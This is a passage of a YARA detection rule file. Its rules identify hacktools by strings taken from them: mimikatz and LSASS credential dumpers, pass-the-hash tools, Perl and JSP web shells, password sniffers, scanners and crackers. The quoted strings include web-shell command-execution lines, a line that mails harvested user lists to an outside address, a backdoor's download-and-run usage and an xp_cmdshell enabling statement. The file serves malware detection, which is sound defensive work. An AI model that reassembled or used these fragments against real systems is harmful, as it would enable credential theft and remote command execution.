$s2 = "This tool allows you to change the NTLM credentials of the current logon session" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00' */
$s3 = "username:domainname:lmhash:nthash" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */
$s4 = "Error in cmdline!. Bye!." fullword ascii /* score: '12.00' */
$s5 = "Error: Cannot open LSASS.EXE!." fullword ascii /* score: '12.00' */
$s6 = "nthash is too long!." fullword ascii /* score: '8.00' */
$s7 = "LSASS HANDLE: %x" fullword ascii /* score: '5.00' */
condition:
uint16(0) == 0x5a4d and filesize < 240KB and 2 of them
}
rule SSC_perlcmd_zip_Folder_cmd {
meta:
description = "Disclosed hacktool set (old stuff) - file cmd.cgi"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "21b5dc36e72be5aca5969e221abfbbdd54053dd8"
strings:
$s0 = "syswrite(STDOUT, \"Content-type: text/html\\r\\n\\r\\n\", 27);" fullword ascii
$s1 = "s/%20/ /ig;" fullword ascii
$s2 = "syswrite(STDOUT, \"\\r\\n</PRE></HTML>\\r\\n\", 17);" fullword ascii
$s4 = "open(STDERR, \">&STDOUT\") || die \"Can't redirect STDERR\";" fullword ascii
$s5 = "$_ = $ENV{QUERY_STRING};" fullword ascii
$s6 = "$execthis = $_;" fullword ascii
$s7 = "system($execthis);" fullword ascii
$s12 = "s/%2f/\\//ig;" fullword ascii
condition:
6 of them
}
rule SSC_SQLMap
{
meta:
author = "Florian Roth"
description = "This signature detects the SQLMap SQL injection tool"
date = "07/2014"
score = 60
strings:
$s1 = "except SqlmapBaseException, ex:"
condition:
1 of them
}
rule SSC_Dos_1 {
meta:
description = "Chinese Hacktool Set - file 1.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "b554f0687a12ec3a137f321cc15e052ff219f28c"
strings:
$s1 = "/churrasco/-->Usage: Churrasco.exe \"command to run\"" fullword ascii
$s2 = "/churrasco/-->Done, command should have ran as SYSTEM!" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}
rule SSC_CN_Hacktool_MilkT_BAT {
meta:
description = "Detects a chinese Portscanner named MilkT - shipped BAT"
author = "Florian Roth"
score = 70
date = "12.10.2014"
strings:
$s0 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" ascii
$s1 = "if not \"%Choice%\"==\"\" set Choice=%Choice:~0,1%" ascii
condition:
all of them
}
rule SSC_CookieTools2 {
meta:
description = "Chinese Hacktool Set - file CookieTools2.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "cb67797f229fdb92360319e01277e1345305eb82"
strings:
$s1 = "www.gxgl.com&www.gxgl.net" fullword wide
$s2 = "ip.asp?IP=" fullword ascii
$s3 = "MSIE 5.5;" fullword ascii
$s4 = "SOFTWARE\\Borland\\" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 700KB and all of them
}
rule SSC_Angry_IP_Scanner_v2_08_ipscan {
meta:
description = "Auto-generated rule on file ipscan.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "70cf2c09776a29c3e837cb79d291514a"
strings:
$s0 = "_H/EnumDisplay/"
$s5 = "ECTED.MSVCRT0x"
$s8 = "NotSupported7"
condition:
all of them
}
rule SSC_wineggdrop : portscanner toolkit
{
meta:
author = "Christian Rebischke (@sh1bumi)"
date = "2015-09-05"
description = "Rules for TCP Portscanner VX.X by WinEggDrop"
in_the_wild = true
family = "Hackingtool/Portscanner"
strings:
$a = { 54 43 50 20 50 6f 72 74 20 53 63 61 6e 6e 65 72
20 56 3? 2e 3? 20 42 79 20 57 69 6e 45 67 67 44
72 6f 70 0a }
$b = "Result.txt"
$c = "Usage:   %s TCP/SYN StartIP [EndIP] Ports [Threads] [/T(N)] [/(H)Banner] [/Save]\n"
condition:
//check for MZ Signature at offset 0
uint16(0) == 0x5A4D
and
//check for wineggdrop specific strings
$a and $b and $c
}
rule SSC_lamescan3 {
meta:
description = "Chinese Hacktool Set - file lamescan3.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "3130eefb79650dab2e323328b905e4d5d3a1d2f0"
strings:
$s1 = "dic\\loginlist.txt" fullword ascii
$s2 = "Radmin.exe" fullword ascii
$s3 = "lamescan3.pdf!" fullword ascii
$s4 = "dic\\passlist.txt" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 3740KB and all of them
}
rule SSC_ProPort_zip_Folder_ProPort {
meta:
description = "Auto-generated rule on file ProPort.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "c1937a86939d4d12d10fc44b7ab9ab27"
strings:
$s0 = "Corrupt Data!"
$s1 = "K4p~omkIz"
$s2 = "DllTrojanScan"
$s3 = "GetDllInfo"
$s4 = "Compressed by Petite (c)1999 Ian Luck."
$s5 = "GetFileCRC32"
$s6 = "GetTrojanNumber"
$s7 = "TFAKAbout"
condition:
all of them
}
rule SSC_sig_238_cmd_2 {
meta:
description = "Disclosed hacktool set (old stuff) - file cmd.jsp"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "be4073188879dacc6665b6532b03db9f87cfc2bb"
strings:
$s0 = "Process child = Runtime.getRuntime().exec(" ascii
$s1 = "InputStream in = child.getInputStream();" fullword ascii
$s2 = "String cmd = request.getParameter(\"" ascii
$s3 = "while ((c = in.read()) != -1) {" fullword ascii
$s4 = "<%@ page import=\"java.io.*\" %>" fullword ascii
condition:
all of them
}
rule SSC_crack_Loader {
meta:
description = "Auto-generated rule on file Loader.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "f4f79358a6c600c1f0ba1f7e4879a16d"
strings:
$s0 = "NeoWait.exe"
$s1 = "RRRRRRRW"
condition:
all of them
}
rule SSC_dat_report {
meta:
description = "Chinese Hacktool Set - file report.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "4582a7c1d499bb96dad8e9b227e9d5de9becdfc2"
strings:
$s1 = "<a href=\"http://www.xfocus.net\">X-Scan</a>" fullword ascii
$s2 = "REPORT-ANALYSIS-OF-HOST" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 480KB and all of them
}
rule SSC_superscan3_0 {
meta:
description = "Disclosed hacktool set (old stuff) - file superscan3.0.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "a9a02a14ea4e78af30b8b4a7e1c6ed500a36bc4d"
strings:
$s0 = "\\scanner.ini" fullword ascii
$s1 = "\\scanner.exe" fullword ascii
$s2 = "\\scanner.lst" fullword ascii
$s4 = "\\hensss.lst" fullword ascii
$s5 = "STUB32.EXE" fullword wide
$s6 = "STUB.EXE" fullword wide
$s8 = "\\ws2check.exe" fullword ascii
$s9 = "\\trojans.lst" fullword ascii
$s10 = "1996 InstallShield Software Corporation" fullword wide
condition:
all of them
}
rule SSC_sekurlsa {
meta:
description = "Chinese Hacktool Set - file sekurlsa.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5"
strings:
$s1 = "Bienvenue dans un processus distant" fullword wide
$s2 = "Format d'appel invalide : addLogonSession [idSecAppHigh] idSecAppLow Utilisateur" wide
$s3 = "SECURITY\\Policy\\Secrets" fullword wide
$s4 = "Injection de donn" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 1150KB and all of them
}
rule SSC_scanarator_iis {
meta:
description = "Auto-generated rule on file iis.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "3a8fc02c62c8dd65e038cc03e5451b6e"
strings:
$s0 = "example: iis 10.10.10.10"
$s1 = "send error"
condition:
all of them
}
rule SSC_Dos_iis {
meta:
description = "Chinese Hacktool Set - file iis.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "61ffd2cbec5462766c6f1c44bd44eeaed4f3d2c7"
strings:
$s1 = "comspec" fullword ascii
$s2 = "program terming" fullword ascii
$s3 = "WinSta0\\Defau" fullword ascii
$s4 = "* FROM IIsWebInfo" ascii
$s5 = "www.icehack." ascii
$s6 = "wmiprvse.exe" fullword ascii
$s7 = "Pid: %d" ascii
condition:
uint16(0) == 0x5a4d and filesize < 70KB and all of them
}
rule SSC_mimikatz_lsass_mdmp
{
meta:
description		= "LSASS minidump file for mimikatz"
author			= "Benjamin DELPY (gentilkiwi)"
strings:
$lsass			= "System32\\lsass.exe"	wide nocase
condition:
(uint32(0) == 0x504d444d) and $lsass
}
rule SSC_UnPack_rar_Folder_TBack {
meta:
description = "Disclosed hacktool set (old stuff) - file TBack.DLL"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "30fc9b00c093cec54fcbd753f96d0ca9e1b2660f"
strings:
$s0 = "Redirect SPort RemoteHost RPort       -->Port Redirector" fullword ascii
$s1 = "http://IP/a.exe a.exe                 -->Download A File" fullword ascii
$s2 = "StopSniffer                           -->Stop Pass Sniffer" fullword ascii
$s3 = "TerminalPort Port                     -->Set New Terminal Port" fullword ascii
$s4 = "Example: Http://12.12.12.12/a.exe abc.exe" fullword ascii
$s6 = "Create Password Sniffering Thread Successfully. Status:Logging" fullword ascii
$s7 = "StartSniffer NIC                      -->Start Sniffer" fullword ascii
$s8 = "Shell                                 -->Get A Shell" fullword ascii
$s11 = "DeleteService ServiceName             -->Delete A Service" fullword ascii
$s12 = "Disconnect ThreadNumber|All           -->Disconnect Others" fullword ascii
$s13 = "Online                                -->List All Connected IP" fullword ascii
$s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword ascii
$s16 = "Example: Set REG_SZ Test Trojan.exe" fullword ascii
$s18 = "Execute Program                       -->Execute A Program" fullword ascii
$s19 = "Reboot                                -->Reboot The System" fullword ascii
$s20 = "Password Sniffering Is Not Running" fullword ascii
condition:
4 of them
}
rule SSC_LinuxHacktool_eyes_mass {
meta:
description = "Linux hack tools - file mass"
author = "Florian Roth"
reference = "not set"
date = "2015/01/19"
hash = "2054cb427daaca9e267b252307dad03830475f15"
strings:
$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
$s1 = "echo -e \"${BLU}Private Scanner By Raphaello , DeMMoNN , tzepelush & DraC\\n\\r" ascii
$s3 = "killall -9 pscan2" fullword ascii
$s5 = "echo \"[*] ${DCYN}Gata esti h4x0r ;-)${RES}  [*]\"" fullword ascii
$s6 = "echo -e \"${DCYN}@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#${RES}\"" fullword ascii
condition:
1 of them
}
rule SSC_SplitJoin_V1_3_3_rar_Folder_3 {
meta:
description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "21409117b536664a913dcd159d6f4d8758f43435"
strings:
$s2 = "ie686@sohu.com" fullword ascii
$s3 = "splitjoin.exe" fullword ascii
$s7 = "SplitJoin" fullword ascii
condition:
all of them
}
rule SSC_sig_238_xsniff {
meta:
description = "Disclosed hacktool set (old stuff) - file xsniff.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "d61d7329ac74f66245a92c4505a327c85875c577"
strings:
$s2 = "xsiff.exe -pass -hide -log pass.log" fullword ascii
$s3 = "%s - simple sniffer for win2000" fullword ascii
$s4 = "xsiff.exe -tcp -udp -asc -addr 192.168.1.1" fullword ascii
$s5 = "HOST: %s USER: %s, PASS: %s" fullword ascii
$s7 = "http://www.xfocus.org" fullword ascii
$s9 = "  -pass        : Filter username/password" fullword ascii
$s18 = "  -udp         : Output udp packets" fullword ascii
$s19 = "Code by glacier <glacier@xfocus.org>" fullword ascii
$s20 = "  -tcp         : Output tcp packets" fullword ascii
condition:
6 of them
}
rule SSC_Ncrack
{
meta:
author = "Florian Roth"
description = "This signature detects the Ncrack brute force tool"
date = "07/2014"
score = 60
strings:
$s1 = "NcrackOutputTable only supports adding up to 4096 to a cell via"
condition:
1 of them
}
rule SSC_mimikatz
{
meta:
description		= "mimikatz"
author			= "Benjamin DELPY (gentilkiwi)"
tool_author		= "Benjamin DELPY (gentilkiwi)"
score          = 80
strings:
$exe_x86_1		= { 89 71 04 89 [0-3] 30 8d 04 bd }
$exe_x86_2		= { 89 79 04 89 [0-3] 38 8d 04 b5 }
$exe_x64_1		= { 4c 03 d8 49 [0-3] 8b 03 48 89 }
$exe_x64_2		= { 4c 8b df 49 [0-3] c1 e3 04 48 [0-3] 8b cb 4c 03 [0-3] d8 }
$dll_1			= { c7 0? 00 00 01 00 [4-14] c7 0? 01 00 00 00 }
$dll_2			= { c7 0? 10 02 00 00 ?? 89 4? }
$sys_x86		= { a0 00 00 00 24 02 00 00 40 00 00 00 [0-4] b8 00 00 00 6c 02 00 00 40 00 00 00 }
$sys_x64		= { 88 01 00 00 3c 04 00 00 40 00 00 00 [0-4] e8 02 00 00 f8 02 00 00 40 00 00 00 }
condition:
(all of ($exe_x86_*)) or (all of ($exe_x64_*)) or (all of ($dll_*)) or (any of ($sys_*))
}
rule SSC_Fierce2
{
meta:
author = "Florian Roth"
description = "This signature detects the Fierce2 domain scanner"
date = "07/2014"
score = 60
strings:
$s1 = "$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars,"
condition:
1 of them
}
rule SSC_APT_Proxy_Malware_Packed_dev
{
meta:
author = "FRoth"
date = "2014-11-10"
description = "APT Malware - Proxy"
hash = "6b6a86ceeab64a6cb273debfa82aec58"
score = 50
strings:
$string0 = "PECompact2" fullword
$string1 = "[LordPE]"
$string2 = "steam_ker.dll"
condition:
all of them
}
rule SSC_cndcom_cndcom {
meta:
description = "Chinese Hacktool Set - file cndcom.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "08bbe6312342b28b43201125bd8c518531de8082"
strings:
$s1 = "- Rewritten by HDM last <hdm [at] metasploit.com>" fullword ascii
$s2 = "- Usage: %s <Target ID> <Target IP>" fullword ascii
$s3 = "- Remote DCOM RPC Buffer Overflow Exploit" fullword ascii
$s4 = "- Warning:This Code is more like a dos tool!(Modify by pingker)" fullword ascii
$s5 = "Windows NT SP6 (Chinese)" fullword ascii
$s6 = "- Original code by FlashSky and Benjurry" fullword ascii
$s7 = "\\C$\\123456111111111111111.doc" fullword wide
$s8 = "shell3all.c" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}
rule SSC_LinuxHacktool_eyes_a {
meta:
description = "Linux hack tools - file a"
author = "Florian Roth"
reference = "not set"
date = "2015/01/19"
hash = "458ada1e37b90569b0b36afebba5ade337ea8695"
strings:
$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
$s1 = "mv scan.log bios.txt" fullword ascii
$s2 = "rm -rf bios.txt" fullword ascii
$s3 = "echo -e \"# by Eyes.\"" fullword ascii
$s4 = "././pscan2 $1 22" fullword ascii
$s10 = "echo \"#cautam...\"" fullword ascii
condition:
2 of them
}
rule SSC_sig_238_hunt {
meta:
description = "Disclosed hacktool set (old stuff) - file hunt.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "f9f059380d95c7f8d26152b1cb361d93492077ca"
strings:
$s1 = "Programming by JD Glaser - All Rights Reserved" fullword ascii
$s3 = "Usage - hunt \\\\servername" fullword ascii
$s4 = ".share = %S - %S" fullword wide
$s5 = "SMB share enumerator and admin finder " fullword ascii
$s7 = "Hunt only runs on Windows NT..." fullword ascii
$s8 = "User = %S" fullword ascii
$s9 = "Admin is %s\\%s" fullword ascii
condition:
all of them
}
rule SSC_Dos_Down32 {
meta:
description = "Chinese Hacktool Set - file Down32.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "0365738acd728021b0ea2967c867f1014fd7dd75"
strings:
$s2 = "C:\\Windows\\Temp\\Cmd.txt" fullword wide
$s6 = "down.exe" fullword wide
$s15 = "get_Form1" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 137KB and all of them
}
rule SSC_PassSniffer_zip_Folder_readme {
meta:
description = "Disclosed hacktool set (old stuff) - file readme.txt"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "a52545ae62ddb0ea52905cbb61d895a51bfe9bcd"
strings:
$s0 = "PassSniffer.exe" fullword ascii
$s1 = "POP3/FTP Sniffer" fullword ascii
$s2 = "Password Sniffer V1.0" fullword ascii
condition:
1 of them
}
rule SSC_HackTool_Samples {
meta:
description = "Hacktool"
score = 50
strings:
$a = "Unable to uninstall the fgexec service"
$b = "Unable to set socket to sniff"
$c = "Failed to load SAM functions"
$d = "Dump system passwords"
$e = "Error opening sam hive or not valid file"
$f = "Couldn't find LSASS pid"
$g = "samdump.dll"
$h = "WPEPRO SEND PACKET"
$i = "WPE-C1467211-7C89-49c5-801A-1D048E4014C4"
$j = "Usage: unshadow PASSWORD-FILE SHADOW-FILE"
$k = "arpspoof\\Debug"
$l = "Success: The log has been cleared"
$m = "clearlogs [\\\\computername"
$n = "DumpUsers 1."
$o = "dictionary attack with specified dictionary file"
$p = "by Objectif Securite"
$q = "objectif-securite"
$r = "Cannot query LSA Secret on remote host"
$s = "Cannot write to process memory on remote host"
$t = "Cannot start PWDumpX service on host"
$u = "usage: %s <system hive> <security hive>"
$v = "username:domainname:LMhash:NThash"
$w = "<server_name_or_ip> | -f <server_list_file> [username] [password]"
$x = "Impersonation Tokens Available"
$y = "failed to parse pwdump format string"
$z = "Dumping password"
condition:
1 of them
}
rule SSC_Ncat_Hacktools_CN {
meta:
description = "Disclosed hacktool set - file nc.exe"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "001c0c01c96fa56216159f83f6f298755366e528"
strings:
$s0 = "nc -l -p port [options] [hostname] [port]" fullword ascii
$s2 = "nc [-options] hostname port[s] [ports] ... " fullword ascii
$s3 = "gethostpoop fuxored" fullword ascii
$s6 = "VERNOTSUPPORTED" fullword ascii
$s7 = "%s [%s] %d (%s)" fullword ascii
$s12 = " `--%s' doesn't allow an argument" fullword ascii
condition:
all of them
}
rule SSC_DK_Brute {
meta:
description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file DK Brute.exe"
author = "Florian Roth"
date = "22.11.14"
score = 70
reference = "http://goo.gl/xiIphp"
hash = "93b7c3a01c41baecfbe42461cb455265f33fbc3d"
strings:
$s6 = "get_CrackedCredentials" fullword ascii
$s13 = "Same port used for two different protocols:" fullword wide
$s18 = "coded by fLaSh" fullword ascii
$s19 = "get_grbToolsScaningCracking" fullword ascii
condition:
all of them
}
rule SSC_mysql_pwd_crack {
meta:
description = "Chinese Hacktool Set - file mysql_pwd_crack.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "57d1cb4d404688804a8c3755b464a6e6248d1c73"
strings:
$s1 = "mysql_pwd_crack 127.0.0.1 -x 3306 -p root -d userdict.txt" fullword ascii
$s2 = "Successfully --> username %s password %s " fullword ascii
$s3 = "zhouzhen@gmail.com http://zhouzhen.eviloctal.org" fullword ascii
$s4 = "-a automode  automatic crack the mysql password " fullword ascii
$s5 = "mysql_pwd_crack 127.0.0.1 -x 3306 -a" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and 1 of them
}
rule SSC_iam_iam : Toolkit  {
meta:
description = "Auto-generated rule - file iam.exe"
author = "Florian Roth"
reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
date = "2015-07-10"
score = 80
hash = "8a8fcce649259f1b670bb1d996f0d06f6649baa8eed60db79b2c16ad22d14231"
strings:
$s1 = "<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */
$s2 = "iam.exe -h administrator:mydomain:"  ascii /* PEStudio Blacklist: strings */ /* score: '40.00' */
$s3 = "An error was encountered when trying to change the current logon credentials!." fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00' */
$s4 = "optional parameter. If iam.exe crashes or doesn't work when run in your system, use this parameter." fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */
$s5 = "IAM.EXE will try to locate some memory locations instead of using hard-coded values." fullword ascii /* score: '26.00' */
$s6 = "Error in cmdline!. Bye!." fullword ascii /* score: '12.00' */
$s7 = "Checking LSASRV.DLL...." fullword ascii /* score: '12.00' */
condition:
uint16(0) == 0x5a4d and filesize < 300KB and all of them
}
rule SSC_Hacktools_CN_Http {
meta:
description = "Disclosed hacktool set - file Http.exe"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "788bf0fdb2f15e0c628da7056b4e7b1a66340338"
strings:
$s0 = "RPCRT4.DLL" fullword ascii
$s1 = "WNetAddConnection2A" fullword ascii
$s2 = "NdrPointerBufferSize" fullword ascii
$s3 = "_controlfp" fullword ascii
condition:
all of them and filesize < 10KB
}
rule SSC_HScan_v1_20_hscan {
meta:
description = "Chinese Hacktool Set - file hscan.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "568b06696ea0270ee1a744a5ac16418c8dacde1c"
strings:
$s1 = "[%s]: Found \"FTP account: anyone/anyone@any.net\"  !!!" fullword ascii
$s2 = "%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,100" fullword ascii
$s3 = ".\\report\\%s-%s.html" fullword ascii
$s4 = ".\\log\\Hscan.log" fullword ascii
$s5 = "[%s]: Found cisco Enable password: %s !!!" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 200KB and 2 of them
}
rule SSC_Payload_Exe2Hex : toolkit {
meta:
description = "Detects payload generated by exe2hex"
author = "Florian Roth"
reference = "https://github.com/g0tmi1k/exe2hex"
date = "2016-01-15"
score = 70
strings:
$a1 = "set /p \"=4d5a" ascii
$a2 = "powershell -Command \"$hex=" ascii
$b1 = "set+%2Fp+%22%3D4d5" ascii
$b2 = "powershell+-Command+%22%24hex" ascii
$c1 = "echo 4d 5a " ascii
$c2 = "echo r cx >>" ascii
$d1 = "echo+4d+5a+" ascii
$d2 = "echo+r+cx+%3E%3E" ascii
condition:
all of ($a*) or all of ($b*) or all of ($c*) or all of ($d*)
}
rule SSC_Smartniff {
meta:
description = "Chinese Hacktool Set - file Smartniff.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "67609f21d54a57955d8fe6d48bc471f328748d0a"
strings:
$s1 = "smsniff.exe" fullword wide
$s2 = "support@nirsoft.net0" fullword ascii
$s3 = "</requestedPrivileges></security></trustInfo></assembly>" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 200KB and all of them
}
rule SSC_kappfree {
meta:
description = "Chinese Hacktool Set - file kappfree.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "e57e79f190f8a24ca911e6c7e008743480c08553"
strings:
$s1 = "Bienvenue dans un processus distant" fullword wide
$s2 = "kappfree.dll" fullword ascii
$s3 = "kappfree de mimikatz pour Windows (anti AppLocker)" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 200KB and all of them
}
rule SSC_UnPack_rar_Folder_InjectT {
meta:
description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "80f39e77d4a34ecc6621ae0f4d5be7563ab27ea6"
strings:
$s0 = "%s -Install                          -->To Install The Service" fullword ascii
$s1 = "Explorer.exe" fullword ascii
$s2 = "%s -Start                            -->To Start The Service" fullword ascii
$s3 = "%s -Stop                             -->To Stop The Service" fullword ascii
$s4 = "The Port Is Out Of Range" fullword ascii
$s7 = "Fail To Set The Port" fullword ascii
$s11 = "\\psapi.dll" fullword ascii
$s20 = "TInject.Dll" fullword ascii
$x1 = "Software\\Microsoft\\Internet Explorer\\WinEggDropShell" fullword ascii
$x2 = "injectt.exe" fullword ascii
condition:
( 1 of ($x*) ) and ( 3 of ($s*) )
}
rule SSC_Dos_Down64 {
meta:
description = "Chinese Hacktool Set - file Down64.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "43e455e43b49b953e17a5b885ffdcdf8b6b23226"
strings:
$s1 = "C:\\Windows\\Temp\\Down.txt" fullword wide
$s2 = "C:\\Windows\\Temp\\Cmd.txt" fullword wide
$s3 = "C:\\Windows\\Temp\\" fullword wide
$s4 = "ProcessXElement" fullword ascii
$s8 = "down.exe" fullword wide
$s20 = "set_Timer1" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 150KB and all of them
}
rule SSC_Mimikatz_Memory_Rule_1 : APT {
meta:
author = "Florian Roth"
date = "12/22/2014"
score = 70
type = "memory"
description = "Detects password dumper mimikatz in memory"
strings:
$s1 = "sekurlsa::msv" fullword ascii
$s2 = "sekurlsa::wdigest" fullword ascii
$s4 = "sekurlsa::kerberos" fullword ascii
$s5 = "sekurlsa::tspkg" fullword ascii
$s6 = "sekurlsa::livessp" fullword ascii
$s7 = "sekurlsa::ssp" fullword ascii
$s8 = "sekurlsa::logonPasswords" fullword ascii
$s9 = "sekurlsa::process" fullword ascii
$s10 = "ekurlsa::minidump" fullword ascii
$s11 = "sekurlsa::pth" fullword ascii
$s12 = "sekurlsa::tickets" fullword ascii
$s13 = "sekurlsa::ekeys" fullword ascii
$s14 = "sekurlsa::dpapi" fullword ascii
$s15 = "sekurlsa::credman" fullword ascii
condition:
1 of them
}
rule SSC_FPipe2_0 {
meta:
description = "Disclosed hacktool set (old stuff) - file FPipe2.0.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "891609db7a6787575641154e7aab7757e74d837b"
strings:
$s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
$s1 = "Unable to resolve hostname \"%s\"" fullword ascii
$s2 = " -s    - outbound connection source port number" fullword ascii
$s3 = "source port for that outbound connection being set to 53 also." fullword ascii
$s4 = "http://www.foundstone.com" fullword ascii
$s19 = "FPipe" fullword ascii
condition:
all of them
}
rule SSC_Project1 {
meta:
description = "Chinese Hacktool Set - file Project1.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "d1a5e3b646a16a7fcccf03759bd0f96480111c96"
strings:
$s1 = "EXEC master.dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll'" fullword ascii
$s2 = "Password.txt" fullword ascii
$s3 = "LoginPrompt" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 5000KB and all of them
}
rule SSC_Tools_termsrv {
meta:
description = "Chinese Hacktool Set - file termsrv.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "294a693d252f8f4c85ad92ee8c618cebd94ef247"
strings:
$s1 = "Iv\\SmSsWinStationApiPort" fullword ascii
$s2 = " TSInternetUser " fullword wide
$s3 = "KvInterlockedCompareExchange" fullword ascii
$s4 = " WINS/DNS " fullword wide
$s5 = "winerror=%1" fullword wide
$s6 = "TermService " fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 1150KB and all of them
}
rule SSC_mysqlfast {
meta:
description = "Chinese Hacktool Set - file mysqlfast.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "32b60350390fe7024af7b4b8fbf50f13306c546f"
strings:
$s2 = "Invalid password hash: %s" fullword ascii
$s3 = "-= MySql Hash Cracker =- " fullword ascii
$s4 = "Usage: %s hash" fullword ascii
$s5 = "Hash: %08lx%08lx" fullword ascii
$s6 = "Found pass: " fullword ascii
$s7 = "Pass not found" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 900KB and 4 of them
}
rule SSC_ByPassFireWall_zip_Folder_Ie {
meta:
description = "Disclosed hacktool set (old stuff) - file Ie.dll"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "d1b9058f16399e182c9b78314ad18b975d882131"
strings:
$s0 = "d:\\documents and settings\\loveengeng\\desktop\\source\\bypass\\lcc\\ie.dll" fullword ascii
$s1 = "LOADER ERROR" fullword ascii
$s5 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
$s7 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
condition:
all of them
}
rule SSC_aspbackdoor_asp1 {
meta:
description = "Disclosed hacktool set (old stuff) - file asp1.txt"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "9ef9f34392a673c64525fcd56449a9fb1d1f3c50"
strings:
$s0 = "param = \"driver={Microsoft Access Driver (*.mdb)}\" " fullword ascii
$s1 = "conn.Open param & \";dbq=\" & Server.MapPath(\"scjh.mdb\") " fullword ascii
$s6 = "set rs=conn.execute (sql)%> " fullword ascii
$s7 = "<%set Conn = Server.CreateObject(\"ADODB.Connection\") " fullword ascii
$s10 = "<%dim ktdh,scph,scts,jhqtsj,yhxdsj,yxj,rwbh " fullword ascii
$s15 = "sql=\"select * from scjh\" " fullword ascii
condition:
all of them
}
rule SSC_HTTPSCANNER {
meta:
description = "Chinese Hacktool Set - file HTTPSCANNER.EXE"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "ae2929346944c1ea3411a4562e9d5e2f765d088a"
strings:
$s1 = "HttpScanner.exe" fullword wide
$s2 = "HttpScanner" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 3500KB and all of them
}
rule SSC_whosthere : Toolkit  {
meta:
description = "Auto-generated rule - file whosthere.exe"
author = "Florian Roth"
reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
date = "2015-07-10"
score = 80
hash = "d7a82204d3e511cf5af58eabdd6e9757c5dd243f9aca3999dc0e5d1603b1fa37"
strings:
